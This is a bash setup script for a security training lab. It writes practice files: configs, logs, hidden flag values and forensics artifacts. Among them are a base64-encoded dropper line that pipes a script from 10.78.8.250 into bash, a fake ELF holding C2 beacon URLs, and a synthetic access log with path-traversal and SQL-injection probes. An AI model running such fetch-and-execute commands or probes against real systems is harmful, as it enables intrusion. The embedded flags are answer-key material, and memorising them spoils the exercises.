#!/usr/bin/env bash
# setup-labs.sh: Initialize lab data, fixtures, and configuration files
# Run this inside the container after startup to populate exercise data

set -euo pipefail

LABS_HOME="${LABS_HOME:-/home/isopod}"

# Create directory structure
mkdir -p "$LABS_HOME/labs" "$LABS_HOME/work"
mkdir -p "$LABS_HOME/data/intake" "$LABS_HOME/data/reports" "$LABS_HOME/data/edits" "$LABS_HOME/data/awk"
mkdir -p /etc/course-lab/app.d /etc/course-lab/empty.d /etc/course-lab/.cache
mkdir -p /etc/systemd/system /usr/local/bin /usr/local/share/course/docs/nested
mkdir -p /var/log/course/archive /var/log/nginx /var/spool/course/jobs
mkdir -p /srv/www/app/public /srv/www/app/private/cache

# System config files
printf "rootfs-lab\n" >/etc/course-lab/README.txt
printf "environment=production\nAPI_KEY=visible\n" >/etc/course-lab/app.conf
printf "environment=staging\nAPI_KEY=old-hidden\n" >/etc/course-lab/app.conf.old
printf "service: course-api\nenabled: true\n" >/etc/course-lab/app.d/api.yaml
printf "service: worker\nenabled: true\n" >/etc/course-lab/app.d/worker.yml
printf "MODULE02_FLAG=trefoil-gate-884\n" >/etc/course-lab/.cache/flag
touch /etc/course-lab/empty.d/empty.conf /etc/course-lab/empty.d/zero.log
printf "leading dash path\n" >/etc/course-lab/--odd-name.conf
printf "alpha=1\n\nbeta=2\n" >/etc/course-lab/runtime.ini

# Systemd service
printf "[Service]\nWorkingDirectory=/srv/www/app\nExecStart=/usr/local/bin/course-worker\n" >/etc/systemd/system/course-worker.service
printf "#!/bin/sh\necho course-worker\n" >/usr/local/bin/course-worker
chmod 0755 /usr/local/bin/course-worker

# Documentation and versioning
printf "TODO: rotate course logs\nINFO boot complete\nTODO: review backup policy\n" >/usr/local/share/course/docs/ops-notes.txt
printf "release 1.2.3\ntool v2.10.0\nbuild 2026-05\n" >/usr/local/share/course/docs/versions.txt
printf "2+2=4\npath /var/log/course/app.log\n" >/usr/local/share/course/docs/literals.txt
printf "hello from the public tree\n" >/usr/local/share/course/docs/nested/one.txt
printf "SECRET=42\n" >/usr/local/share/course/docs/nested/vault.txt
printf "binary before\000after\n" >/usr/local/share/course/docs/has_nul.dat

# System logs
printf "Jan 02 10:00:00 lab sshd[101]: Accepted password for isopod\nJan 02 10:01:00 lab sudo: isopod : TTY=pts/0 ; COMMAND=/usr/bin/id\nJan 02 10:02:00 lab sshd[105]: Failed password for invalid user admin\n" >/var/log/auth.log
printf "Jan 02 INFO service started\nJan 02 ERROR disk full\nJan 02 WARN retrying\n" >/var/log/course/app.log
printf "Jan 02 INFO backup started\nJan 02 INFO backup complete\n" >/var/log/course/backup.log
printf "Jan 01 INFO rotated app log\n" >/var/log/course/archive/app.log.1
printf "Jan 01 ERROR fail deploy\nJan 01 INFO retry\nJan 01 ERROR fail backup\n" >/var/log/course/archive/build.log
printf "127.0.0.1 - - [02/Jan/2026:10:00:00 +0000] \"GET / HTTP/1.1\" 200\n" >/var/log/nginx/access.log
printf "2026/01/02 10:00:01 [error] connect() failed while connecting to upstream\n" >/var/log/nginx/error.log

# Job queue and cache
printf "queued\n" >/var/spool/course/jobs/job-001.txt
printf "cached\n" >/srv/www/app/private/cache/state.dat
printf "index\n" >/srv/www/app/public/index.html

# Lab data: intake
printf "Incident intake note\nSource=mail-gateway\nCase=INC-2026-041\n" >"$LABS_HOME/data/intake/readme.txt"
printf "\177ELF\002\001\001\000NOTREAL\000MODULE03_FLAG=hex-gateway-441\000\377\376\375" >"$LABS_HOME/data/intake/suspicious.bin"
touch "$LABS_HOME/data/intake/empty.upload"
printf "Label=unicode-gateway-330\nNote=received from café scanner\n" >"$LABS_HOME/data/intake/utf8-note.txt"
printf "#!/bin/sh\necho do-not-run-this-upload\n" >"$LABS_HOME/data/intake/invoice.txt"

# Lab data: reports
printf "host\trole\tlatency_ms\nfw-01\tfirewall\t7\nvpn-01\tvpn\t18\nsiem-01\tsiem\t42\nweb-01\tweb\t11\n" >"$LABS_HOME/data/reports/asset-latency.tsv"
printf "ticket,queue,priority\n1001,auth,2\n1002,network,1\n1003,malware,5\n" >"$LABS_HOME/data/reports/incidents.csv"
printf "iad\nfra\nsin\n" >"$LABS_HOME/data/reports/site-codes.txt"
printf "us-east\neu-central\nap-south\n" >"$LABS_HOME/data/reports/site-regions.txt"
printf "nginx    80   running\nsshd   22  running\nbackup     873   stopped\n" >"$LABS_HOME/data/reports/services.ragged"
printf "module four drill\n" >"$LABS_HOME/data/reports/lowercase-note.txt"
printf "  failed     password   from    198.51.100.23\n" >"$LABS_HOME/data/reports/noisy-auth-line.txt"
printf "user (alice) action (login) result success\n" >"$LABS_HOME/data/reports/audit-brackets.txt"
printf "fw001ALLOW tcp 443\nvp018DENY  udp 500\n" >"$LABS_HOME/data/reports/firewall-fixed.txt"
printf "L01 auth accepted\nL02 auth failed\nL03 sudo start\nL04 sudo stop\nL05 ssh open\nL06 ssh close\nL07 cron run\nL08 cron done\nL09 backup start\nL10 backup ok\n" >"$LABS_HOME/data/reports/ops-ledger.log"
printf "2026-05-13T10:00:01Z INFO sshd accepted\n2026-05-13T10:00:02Z WARN disk low\n2026-05-13T10:00:03Z ERROR postgres timeout\n2026-05-13T10:00:04Z WARN retrying postgres\n2026-05-13T10:00:05Z INFO recovered\n2026-05-13T10:00:06Z NOTICE closed\n" >"$LABS_HOME/data/edits/numbered-events.log"

# Lab data: edits
printf "SELECT id FROM users;\nDROP TABLE audit_log;\nSELECT count(*) FROM sessions;\nDROP INDEX idx_sessions;\nSELECT ok;\n" >"$LABS_HOME/data/edits/db-replay.sql"
printf "auth=REDACT_ME\nretry=REDACT_ME\nnote=REDACT_ME tail\n" >"$LABS_HOME/data/edits/tokenized.conf"
printf "10.0.0.1 left 10.0.0.1 right\nonly 10.0.0.1 once\n10.0.0.1 A 10.0.0.1 B 10.0.0.1 C\n" >"$LABS_HOME/data/edits/ip-line.txt"
printf "see http://lab-web/docs and also http://lab-web/api/status.php\n" >"$LABS_HOME/data/edits/urls.txt"
printf "contact alice@example.com please\nadmin root@corp.internal now\n" >"$LABS_HOME/data/edits/contacts.txt"
printf "noise MODULE05_FLAG=silver-rim-220 more noise\n" >"$LABS_HOME/data/edits/flag-line.txt"
printf "INFO start\nWARN disk low\nERROR db down\nWARN retry\nINFO ok\n" >"$LABS_HOME/data/edits/events.log"
printf "START 1\nMID 2\nEND 3\n" >"$LABS_HOME/data/edits/simple.log"

# Lab awk data
printf "one two three\nfour five six\n" >"$LABS_HOME/data/awk/input.txt"
printf "# app listener\nport=80\nbind=0.0.0.0\n" >"$LABS_HOME/data/edits/service.ini"
printf "alice,auth\nbob,network\n" >"$LABS_HOME/data/edits/owner-queue.csv"
printf "queue\tminutes\nauth\t10\nnetwork\t22\nauth\t5\nnetwork\t7\n" >"$LABS_HOME/data/awk/queue-times.tsv"
printf "ticket auth\nticket network\nticket auth\nticket auth\nticket network\n" >"$LABS_HOME/data/awk/tickets.txt"
printf "May 13 INFO ok\nMay 13 ERROR postgres timeout\nMay 13 WARN retry\nMay 13 ERROR auth lockout\n" >"$LABS_HOME/data/awk/syslog.log"
printf "alpha beta gamma delta epsilon\n1 2 3 4 5\nshort row here\nuser id source dest action\n" >"$LABS_HOME/data/awk/fields.txt"
printf "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndeploy:x:1001:1001:Deploy:/home/deploy:/bin/bash\nbackupsvc:x:1002:1002:Backup:/home/backupsvc:/usr/sbin/nologin\n" >"$LABS_HOME/data/awk/passwd.sample"
printf "1 Authentication\n2 Network\n" >"$LABS_HOME/data/awk/queue-names.txt"
printf "1 auth\n2 network\n" >"$LABS_HOME/data/awk/queue-codes.txt"

# ── forensics/01-artifacts ────────────────────────────────────────────────────
FDIR="$LABS_HOME/labs/forensics/01-artifacts"
mkdir -p "$FDIR"

# payload.bin: ELF magic header followed by embedded C2 strings and padding
python3 -c "
import sys
data  = b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 8
data += b'# beacon interval: 60\x00'
data += b'http://10.78.8.250/c2/update\x00'
data += b'User-Agent: Mozilla/5.0\x00'
data += b'\x00' * 64
sys.stdout.buffer.write(data)
" > "$FDIR/payload.bin"

# dropper.b64: base64-encoded one-liner reverse shell dropper
printf '#!/bin/bash\ncurl -s http://10.78.8.250/shell.sh | bash\n' | base64 -w 0 > "$FDIR/dropper.b64"
printf '\n' >> "$FDIR/dropper.b64"

# photo.jpg: valid tiny JFIF with attacker-stamped EXIF metadata
python3 << 'PYEOF' > "$FDIR/photo.jpg"
import base64
import sys

data = (
    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////"
    "2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/"
    "8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAH/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/"
    "9oACAEBAAEFAqf/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDAQE/ASP/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAECAQE/ASP/"
    "xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBAAY/Al//xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBAAE/IV//2gAMAwEAAgADAAAAEP/"
    "EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QH//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8QH//EABQQAQAAAAAAAAAAAA"
    "AAAAAAABD/2gAIAQEAAT8QH//Z"
)
sys.stdout.buffer.write(base64.b64decode(data))
PYEOF
exiftool -overwrite_original -q \
  -Artist="ops-team" \
  -Comment="captured: 2024-03-15 02:31:07" \
  -GPSLatitude="48.8566" -GPSLatitudeRef="N" \
  -GPSLongitude="2.3522"  -GPSLongitudeRef="E" \
  "$FDIR/photo.jpg" 2>/dev/null || true

# report.tar.gz: archive with two innocent files and one hidden flag file
_rtmp=$(mktemp -d)
mkdir -p "$_rtmp/report"
printf 'Incident report — 2024-03-15\nAnalyst: L. Reyes\nCase: INC-2024-089\n' > "$_rtmp/report/summary.txt"
printf '2024-03-15 02:31 - initial access observed\n2024-03-15 02:45 - lateral movement to admin panel\n' > "$_rtmp/report/notes.log"
printf 'FLAG=hermit-anchor-0x01\n' > "$_rtmp/report/.c2.key"
tar -czf "$FDIR/report.tar.gz" -C "$_rtmp" report
rm -rf "$_rtmp"

# ── forensics/02-logs ─────────────────────────────────────────────────────────
FDIR="$LABS_HOME/labs/forensics/02-logs"
mkdir -p "$FDIR"

python3 << 'PYEOF' > "$FDIR/access.log"
import sys

ATTACKER = "192.168.99.201"
ATK_UA   = "sqlmap/1.7.8#stable (https://sqlmap.org)"
LEGIT    = ["10.0.0.5", "185.23.45.67", "91.108.4.1"]
LEG_UA   = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122"

def entry(ip, day, hh, mm, ss, method, path, status, size, ua):
    ts = f"{day:02d}/Mar/2024:{hh:02d}:{mm:02d}:{ss:02d} +0000"
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'

out = []

# 225 legitimate requests (75 per IP), spread across early morning hours
legit_paths = ["/", "/index.php", "/about", "/products",
               "/contact", "/api/status", "/static/app.css"]
for i in range(225):
    ip   = LEGIT[i % 3]
    path = legit_paths[i % len(legit_paths)]
    hh   = i // 30
    mm   = (i % 30) * 2
    out.append(entry(ip, 15, hh, mm, 0, "GET", path, 200, 1024 + (i * 7) % 512, LEG_UA))

# 85 attacker requests starting at 02:31
atk = [
    (2, 31,  0, "GET",  "/robots.txt",                         200, 43),
    (2, 31, 12, "GET",  "/sitemap.xml",                        404, 152),
    (2, 31, 24, "GET",  "/admin/",                             403, 278),
    (2, 31, 36, "GET",  "/.git/HEAD",                          404, 152),
    (2, 31, 48, "GET",  "/phpinfo.php",                        404, 152),
    (2, 32,  0, "GET",  "/../../../../etc/passwd",              400, 226),
    (2, 32, 12, "GET",  "/%2e%2e/%2e%2e/etc/shadow",           400, 226),
    (2, 32, 24, "GET",  "/wp-admin/",                          404, 152),
    (2, 32, 36, "GET",  "/wp-login.php",                       404, 152),
    (2, 32, 48, "GET",  "/admin/login.php",                    404, 152),
    (2, 33,  0, "GET",  "/admin/config.php",                   200, 4521),
    (2, 33, 12, "GET",  "/api/users",                          200, 892),
    (2, 33, 24, "GET",  "/api/users?id=1",                     200, 234),
    (2, 33, 36, "GET",  "/api/users?id=2",                     200, 198),
    (2, 33, 48, "GET",  "/api/users?id=3",                     200, 201),
    (2, 34,  0, "GET",  "/api/users?id=1 OR 1=1",              500, 112),
    (2, 34, 12, "GET",  "/api/users?id=1'--",                  500, 112),
    (2, 34, 24, "GET",  "/api/users?id=SLEEP(5)",              500, 112),
    (2, 34, 36, "GET",  "/api/status",                         200, 89),
    (2, 34, 48, "POST", "/api/upload?flag=tide-runner-0x02",   200, 128),
]
# Fill remaining 65 with 403 responses spread across the next 13 minutes
for i in range(65):
    mm = 35 + i // 5
    ss = (i % 5) * 12
    atk.append((2, mm, ss, "GET", "/api/status", 403, 89))

for hh, mm, ss, method, path, status, size in atk:
    out.append(entry(ATTACKER, 15, hh, mm, ss, method, path, status, size, ATK_UA))

print("\n".join(out))
PYEOF

# Fix ownership
chown -R isopod:isopod "$LABS_HOME"
